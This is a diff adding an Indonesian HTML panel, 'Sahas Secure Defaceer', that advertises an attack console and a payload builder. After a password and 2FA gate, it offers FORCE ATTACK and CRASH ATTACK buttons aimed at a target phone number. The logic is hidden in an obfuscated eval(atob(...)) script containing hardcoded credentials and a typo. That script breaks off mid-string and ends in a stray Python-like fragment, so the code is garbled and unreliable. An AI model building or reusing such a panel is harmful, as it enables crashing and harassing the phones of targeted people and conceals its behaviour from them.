@@ -1,1 +1,95 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Sahas Secure Defaceer</title><script>document.write(atob('PCEtLSBkb2NfdHlwZTogaHRtbCwgdGl0bGUgcGFuZWwgc2FodWFzID4hRE9DVFlQRSBodG1sIGxhbmc9ImlkIj48aHRtbCBsYW5nPSJpZCI+PGhlYWQ+ICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4gIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPiAgPHRpdGxlPlNhaGFzIFNlY3VyZSBEZWZhY2VlcjwvdGl0bGU+ICA8IS0tIEdvb2dsZSBGb250ICYgRm9udCBBd2Vzb21lIC0tPiAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3I/ PCEtLSBtb3JlIHRleHQgc3ViamVjdCAtLT48L2hlYWQ+PGJvZHkgPkhlbGxvPC9ib2R5PjwvaHRtbD4='));</script></head></html>
+<!DOCTYPE html><html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sahas Secure Defaceer</title>
+  <!-- Google Font & Font Awesome -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" />
+  <style>
+    :root {
+      --brand-500:#2563eb;--brand-600:#1d4ed8;
+      --success-500:#16a34a;--error-500:#dc2626;
+      --grey-950:#060606;--grey-900:#0f0f0f;--grey-850:#141414;--grey-800:#1a1a1a;--grey-750:#1f1f1f;--grey-700:#252525;--grey-600:#3a3a3a;--grey-300:#d4d4d4;--white:#ffffff;
+      --radius-s:8px;--radius-m:14px;--shadow-m:0 2px 6px rgba(0,0,0,.35);
+      --shadow-xl:0 6px 18px rgba(0,0,0,.55);
+      --font:'Inter',system-ui,sans-serif;--text-base:15px;
+    }
+    *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:var(--font);background:var(--grey-950);color:var(--white);min-height:100vh;display:flex;flex-direction:column;line-height:1.5;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    button{border:none;background:none;font-family:inherit;cursor:pointer}
+    header{background:var(--grey-900);padding:16px 24px;display:flex;justify-content:space-between;align-items:center;box-shadow:var(--shadow-m)}
+    .brand{display:flex;align-items:center;gap:12px;font-weight:600;font-size:18px}
+    .brand img{width:46px;height:46px;border-radius:var(--radius-s)}
+    main{flex:1;width:100%;padding:40px 16px;display:flex;justify-content:center}
+    .wrapper{width:100%;max-width:960px;display:flex;flex-direction:column;gap:42px}
+    .card{background:linear-gradient(135deg,var(--grey-850),var(--grey-800));padding:28px;border-radius:var(--radius-m);box-shadow:var(--shadow-m);transition:transform .3s,box-shadow .3s}
+    .card:hover{transform:translateY(-4px);box-shadow:var(--shadow-xl)}
+    h2{font-size:19px;font-weight:600;margin-bottom:20px;display:flex;align-items:center;gap:10px;background:linear-gradient(90deg,var(--brand-500),var(--brand-600));-webkit-background-clip:text;color:transparent}
+    .muted{color:var(--grey-300);font-size:14px;margin-bottom:14px;line-height:1.65}
+    .feature-list{display:flex;flex-direction:column;gap:10px;margin:16px 0}
+    .feature-list li{display:flex;gap:12px;align-items:center;background:var(--grey-750);padding:12px 16px;border-radius:var(--radius-s)}
+    .feature-list i{color:var(--brand-500)}
+    .badge{background:var(--brand-500);color:#fff;font-size:12px;font-weight:600;border-radius:99px;padding:2px 8px}
+    .btn{display:inline-flex;align-items:center;gap:8px;padding:13px 26px;margin-top:18px;background:linear-gradient(135deg,var(--brand-500),var(--brand-600));color:#fff;border-radius:var(--radius-s);box-shadow:0 2px 6px rgba(37,99,235,.4);transition:transform .25s,box-shadow .25s}
+    .btn:hover{transform:translateY(-3px);box-shadow:0 6px 12px rgba(37,99,235,.55)}
+    .hidden{display:none!important}
+    input{width:100%;padding:14px 16px;background:var(--grey-700);color:#fff;border:1px solid var(--grey-600);border-radius:var(--radius-s);font-size:var(--text-base);margin-top:6px}
+    input:focus{outline:none;border-color:var(--brand-500);box-shadow:0 0 0 2px rgba(37,99,235,.35)}
+    footer{background:var(--grey-900);text-align:center;padding:14px;font-size:13px;color:var(--grey-300)}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand"><img src="https://files.catbox.moe/da6uqg.jpg" alt="logo"><span>SAHASSITE</span></div>
+  </header>
+  <main>
+    <div class="wrapper">
+      <section class="card">
+        <h2><i class="fas fa-circle-info"></i>Tentang Panel</h2>
+        <p class="muted">Sahas Secure Access Panel adalah platform eksklusif untuk pengujian keamanan, serangan, dan pembangunan payload.</p>
+      </section><!-- PRODUCT SECTION -->
+  <section class="card" id="productSection">
+    <h2><i class="fas fa-toolbox"></i>Sahas Product <span class="badge">NEW</span></h2>
+    <p class="muted">Platform <strong>Sahas Secure Access Panel</strong> untuk pengujian keamanan, serangan, dan pembuatan payload instan.</p>
+    <ul class="feature-list">
+      <li><i class="fas fa-shield-halved"></i> Login Aman + 2FA</li>
+      <li><i class="fas fa-bolt"></i> Attack Console (Crash &amp; Force Payload)</li>
+      <li><i class="fas fa-bug-slash"></i> Builder Payload Otomatis</li>
+      <li><i class="fas fa-star"></i> Akses Premium (TRHEXS Certified)</li>
+      <li><i class="fas fa-headset"></i> Support CS &amp; Grup Diskusi</li>
+    </ul>
+    <a href="https://wa.me/6288991233030" target="_blank" class="btn"><i class="fas fa-rocket"></i> Get Started</a>
+  </section>
+
+  <!-- LOGIN SECTION -->
+  <section id="loginSection" class="card hidden">
+    <h2><i class="fas fa-lock"></i>Secure Login</h2>
+    <p class="muted">Masukkan kata sandi.</p>
+    <input id="passInput" type="password" placeholder="Password" autocomplete="off">
+    <button class="btn" onclick="firstStep()">Next</button>
+  </section>
+
+  <!-- 2FA SECTION -->
+  <section id="codeSection" class="card hidden">
+    <h2><i class="fas fa-shield"></i>Two-Factor Authentication</h2>
+    <p class="muted">Masukkan kode 2FA.</p>
+    <input id="codeInput" type="text" placeholder="Kode 2FA">
+    <button class="btn" onclick="verifyCode()">Verify</button>
+  </section>
+
+  <!-- ATTACK SECTION -->
+  <section id="attackSection" class="card hidden">
+    <h2><i class="fas fa-bug"></i>Attack Console</h2>
+    <input id="targetNumber" type="text" placeholder="Nomor Target (62xxx)">
+    <button class="btn" onclick="sendBug('FORCE ATTACK')">FORCE ATTACK</button>
+    <button class="btn" onclick="sendBug('CRASH ATTACK')">CRASH ATTACK</button>
+  </section>
+</div>
+
+  </main>
+  <footer>© 2025 • Sahas. All Rights Reserved.</footer>  <script>eval(atob('Y29uc3QgUEFTU1dPUkQ9J1NBSEFTVjEnO2NvbnN0IENPREU9J1NBSEFTT0ZGQyc7CmNvbnN0IHByb2R1Y3RTZWM9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2R1Y3RTZWN0aW9uJyk7CmNvbnN0IGxvZ2luU2VjPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKTsKY29uc3QgY29kZVNlYz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29kZVNlY3Rpb24nKTsKY29uc3QgYXR0YWNrU2VjPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdHRhY2tTZWN0aW9uJyk7CmZ1bmN0aW9uIGZpcnN0U3RlcCgpewogIGNvbnN0IHB3PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzSW5wdXQnKS52YWx1ZTsKICBpZihwdz09PVBBU1NXT1JFKXsKICAgIHByb2R1Y3RTZWMuY2xhc3NMaXN0LmFkZCgnaGlkZGVuJyk7CiAgICBsb2dpblNlYy5jbGFzc0xpc3QuYWRkKCdoaWRkZW4nKTsKICAgIGNvZGVTZWMuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyk7CiAgfWVsc2UgYWxlcnQoJ1Bhc3N3b3JkIHNhbGFoIScpOwp9CmZ1bmN0aW9uIHZlcmlmeUNvZGUoKXsKICBjb25zdCBrPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb2RlSW5wdXQnKS52YWx1ZS50cmltKCk7CiAgaWYoaz09PUNPREUpewogICAgY29kZVNlYy5jbGFzc0xpc3QuYWRkKCdoaWRkZW4nKTsKICAgIGF0dGFja1NlYy5jbGFzc0xpc3QucmVtb3ZlKCdoaWRkZW4nKTsKICB9ZWxzZSBhbGVydCgnS29kZSBzYWxhaCEnKTsKfQpmdW5jdGlvbiBzZW5kQnVnKHR5cGUpewogIGNvbnN0IG51bT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgn'+
+b64[len(b64)//2:][:200]}}
+</body>
+  </html>
